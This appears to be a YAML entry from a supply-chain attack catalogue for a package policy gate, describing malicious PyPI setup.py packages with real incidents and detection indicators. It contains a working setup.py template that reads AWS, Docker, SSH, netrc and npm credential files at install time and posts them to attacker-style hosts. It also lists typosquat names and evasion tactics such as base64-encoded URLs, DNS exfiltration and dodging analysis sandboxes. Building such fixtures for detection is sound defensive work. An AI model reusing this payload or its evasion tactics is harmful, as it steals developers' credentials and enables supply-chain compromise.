  - id: pypi_setup_py_exfil
    family: pypi_lifecycle
    severity: critical
    real_world_examples:
      - name: "ctx@0.2.2 (May 2022 PyPI takeover, exfil ~/.aws/credentials)"
        date: "2022-05-23"
        url: "https://www.bleepingcomputer.com/news/security/pypi-package-ctx-and-php-library-phpass-hijacked-to-steal-aws-keys/"
      - name: "phpass (PyPI typosquat of phpass, same actor as ctx)"
        date: "2022-05-23"
        url: "https://www.bleepingcomputer.com/news/security/pypi-package-ctx-and-php-library-phpass-hijacked-to-steal-aws-keys/"
      - name: "request (PyPI typosquat of requests)"
        date: "2022-12-12"
        url: "https://blog.phylum.io/phylum-discovers-revived-crypto-wallet-targeting-malware-in-pypi/"
    description: |
      A malicious setup.py runs arbitrary Python at install time. The
      most common payload reads cloud credential files (~/.aws/credentials,
      ~/.docker/config.json, ~/.netrc) and POSTs the contents to an
      attacker-controlled endpoint. Wheels (.whl) MUST NOT execute code
      at install; sdists (.tar.gz with setup.py) routinely do. The
      apiary policy gate treats any sdist as carrying a synthetic
      `setup_py` install-script hook so the install-scripts rule fires.
    indicators:
      - sdist (.tar.gz / .zip) distribution with no matching wheel
      - setup.py reading ~/.aws, ~/.docker, ~/.netrc, ~/.ssh, ~/.npmrc
      - urllib.request / requests.post / http.client in setup.py
      - subprocess.Popen or os.system in setup.py
      - base64 / zlib decode of an embedded payload string in setup.py
    injection_template_py: |
      # injected as setup.py (PyPI sdist)
      from setuptools import setup
      import os, json, urllib.request, pathlib
      try:
          home = pathlib.Path.home()
          payload = {}
          for candidate in ('.aws/credentials', '.docker/config.json',
                            '.netrc', '.ssh/id_rsa', '.npmrc'):
              p = home / candidate
              if p.exists():
                  payload[candidate] = p.read_text(errors='replace')
          req = urllib.request.Request(
              '{{EXFIL_URL}}',
              data=json.dumps(payload).encode('utf-8'),
              headers={'Content-Type': 'application/json'},
          )
          urllib.request.urlopen(req, timeout=5)
      except Exception:
          pass
      setup(name='{{PKG_NAME}}', version='{{PKG_VERSION}}')
    injection_target_files:
      - '"setup.py: new file with payload above"'
      - '"setup.cfg: optional sibling for sdist metadata"'
    template_variables:
      EXFIL_URL:
        - '"https://exfil-archive.example.invalid/c"'
        - '"https://aws-keys.xyz/r"'
        - '"https://pypi-stats.tk/log"'
      PKG_NAME:
        - '"ctx"'
        - '"phpass"'
        - '"request"'
        - '"colourama"'
      PKG_VERSION:
        - '"0.2.2"'
        - '"9.9.9"'
    variants_to_generate: 6
    diversity_strategies:
      - move payload into a separate __init__.py and import it from setup.py
      - encode EXFIL_URL with base64 inside the file
      - read EC2 IMDSv2 metadata (169.254.169.254) before credential files
      - exfiltrate via DNS TXT lookups instead of HTTPS
      - target only Linux paths (~/) to avoid Windows analysis sandboxes

